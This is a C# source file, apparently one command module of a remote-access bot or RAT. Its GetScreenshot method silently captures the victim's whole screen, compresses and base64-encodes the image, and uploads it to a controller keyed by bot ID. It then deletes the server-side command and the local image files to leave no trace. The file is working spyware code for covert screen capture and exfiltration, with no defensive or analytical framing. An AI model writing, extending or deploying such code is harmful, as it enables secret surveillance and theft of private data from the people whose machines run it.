using System;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Imaging;

namespace ConsoleApp3
{
    internal class cmd_GetScreenshot
    {
        public void GetScreenshot(string key, string bot_id, string pc_name)
        {
            Random rnd = new Random();
            string image_name = string.Concat(Enumerable.Range(0, 5).Select(_ => rnd.Next(0, 256).ToString("x1")));
            string path = $"C:\\Users\\{pc_name}\\{image_name}.png";
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
            printscreen.Save(path, System.Drawing.Imaging.ImageFormat.Png);
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);
            ImageCompression(path, 50);
            Base64 base64 = new Base64();
            var content = base64.ToBase64_Image(pc_name, image_name);
            post_req.addOtherData(key, bot_id, "screenshot", content);
            File.Delete(path);
            File.Delete($"C:\\Users\\{pc_name}\\{image_name}_сжато_на_50.png");
        }

        static void ImageCompression(string path, long compression)
        {
            using (Bitmap bmp = new Bitmap(path))
                bmp.Save(
                    Path.ChangeExtension(path, "").Trim('.') + $"_сжато_на_{compression}.png",
                    ImageCodecInfo.GetImageEncoders()[1],
                    new EncoderParameters()
                    {
                        Param = new EncoderParameter[]
                        {
                            new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 100L - compression)
                        }
                    });
        }
    }

    

}
